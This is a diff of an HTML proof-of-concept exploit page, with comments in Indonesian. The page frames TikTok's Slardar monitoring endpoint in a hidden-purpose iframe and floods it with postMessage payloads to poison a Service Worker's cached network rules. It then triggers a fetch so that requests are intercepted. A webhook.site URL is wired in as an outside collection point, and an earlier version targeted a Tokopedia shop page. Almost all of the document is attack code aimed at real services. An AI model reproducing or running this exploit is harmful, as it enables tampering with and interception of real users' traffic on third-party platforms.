@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Service Verification System</title>
+    <title>Service Verification</title>
 </head>
 <body style="background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px;">
     <div style="border: 1px solid #0f0; display: inline-block; padding: 20px;">
-        <h1 id="status">[ INITIALIZING ]</h1>
-        <p id="sub-status">Connecting to mon.tiktokv.com...</p>
+        <h1 id="status">[ PHASE: INITIALIZING ]</h1>
+        <p id="sub-status">Targeting Slardar Monitoring Endpoint...</p>
     </div>
 
     <iframe id="pwn_gate" 
@@ -17,15 +17,13 @@
         const gate = document.getElementById('pwn_gate');
         const statusH1 = document.getElementById('status');
         const statusP = document.getElementById('sub-status');
-        
-        // GANTI INI DENGAN ID WEBHOOK LU
-        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; 
+        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; // GANTI ID LU
 
         const payload = {
             source: "main_thread",
             eventName: "network_rule",
             data: [{
-                ruleName: "zero_click_final_v6",
+                ruleName: "slardar_config_poisoning",
                 global: true,
                 conditions: [],
                 handlers: [{
@@ -38,88 +36,42 @@
         };
 
         gate.onload = function() {
-            statusH1.innerText = "[ INJECTING ]";
-            statusP.innerText = "Sending cross-origin message...";
-            
-            // 1. Wake up call agar Service Worker aktif mendengarkan
+            statusH1.innerText = "[ PHASE: INJECTING ]";
+            statusP.innerText = "Bypassing PNS Logic via postMessage...";
+
+            // 1. Kirim sinyal bangun untuk Service Worker
             gate.contentWindow.postMessage({source: "main_thread", eventName: "ready_for_msg"}, "*");
 
             setTimeout(() => {
-                // 2. Kirim payload rule secara berulang (spam)
-                let count = 0;
-                const bomb = setInterval(() => {
-                    try {
-                        gate.contentWindow.postMessage(payload, "*");
-                    } catch(e) {}
-                    
-                    count++;
-                    if (count > 40) {
-                        clearInterval(bomb);
-                        statusH1.innerText = "[ WAITING ]";
-                        statusP.innerText = "Syncing with Cache Storage (10s)...";
-                        
-                        // 3. JEDA KRUSIAL: Beri waktu Service Worker menulis ke cache internal
-                        setTimeout(executeFinalTrigger, 10000);
-                    }
-                }, 100);
-            }, 1000);
-        };
-
-        function executeFinalTrigger() {
-            statusH1.innerText = "[ TRIGGERING ]";
-            statusP.innerText = "PNS Logic Interception in progress...";
-            
-            // 4. Trigger fetch ke endpoint yang sama (200 OK)
-            // Ini akan memaksa Service Worker yang sudah terinfeksi memproses request
-            fetch("https://mon.tiktokv.com/monitor_web/settings/browser-settings", { 
-                mode: 'no-cors',
-                cache: 'no-store' 
-            }).then(() => {
-                statusH1.innerText = "[ COMPLETED ]";
-                statusP.innerText = "Check Reqable for X-Pns-Referrer on browser-settings request";
-            });
-        }
-    </script>
-</body>
-</html>
-
-        gate.onload = function() {
-            statusH1.innerText = "[ PHASE 2: INJECTING ]";
-            statusP.innerText = "Bypassing Origin Restrictions...";
-
-            // 1. Kirim pesan aktivasi
-            gate.contentWindow.postMessage({source: "main_thread", eventName: "ready_for_msg"}, "*");
-
-            setTimeout(() => {
-                // 2. Tembakkan payload inti
+                // 2. Spam payload ke Service Worker
                 let count = 0;
                 const bomb = setInterval(() => {
                     gate.contentWindow.postMessage(payload, "*");
                     count++;
                     if (count > 50) {
                         clearInterval(bomb);
-                        statusH1.innerText = "[ PHASE 3: PERSISTING ]";
-                        statusP.innerText = "Syncing with Cache Storage (10s)...";
+                        statusH1.innerText = "[ PHASE: PERSISTING ]";
+                        statusP.innerText = "Waiting for Cache Storage sync (10s)...";
                         
-                        // 3. Jeda lebih lama (10 detik) untuk memastikan penulisan cache selesai
-                        setTimeout(verifyAndTrigger, 10000);
+                        // 3. Jeda 10 detik agar penulisan cache selesai
+                        setTimeout(triggerFinal, 10000);
                     }
                 }, 100);
             }, 1000);
         };
 
-        function verifyAndTrigger() {
-            statusH1.innerText = "[ PHASE 4: TRIGGERING ]";
-            statusP.innerText = "Executing intercept request...";
+        function triggerFinal() {
+            statusH1.innerText = "[ PHASE: TRIGGERING ]";
+            statusP.innerText = "Testing intercept on Slardar endpoint...";
             
-            // 4. Trigger fetch ke manifest lagi agar diintersep oleh SW yang sudah terinfeksi
-            fetch("https://shop-id.tokopedia.com/manifest.json", { 
+            // 4. Trigger fetch ke endpoint yang sama (200 OK)
+            fetch("https://mon.tiktokv.com/monitor_web/settings/browser-settings", { 
                 mode: 'no-cors',
                 cache: 'no-store' 
             }).then(() => {
                 statusH1.innerText = "[ COMPLETED ]";
-                statusP.innerText = "Check Reqable for X-Pns-Referrer on manifest.json";
-                console.log("PoC Finished.");
+                statusP.innerText = "Verify via Reqable or Cache Storage.";
+                console.log("PoC Sequence Finished.");
             });
         }
     </script>
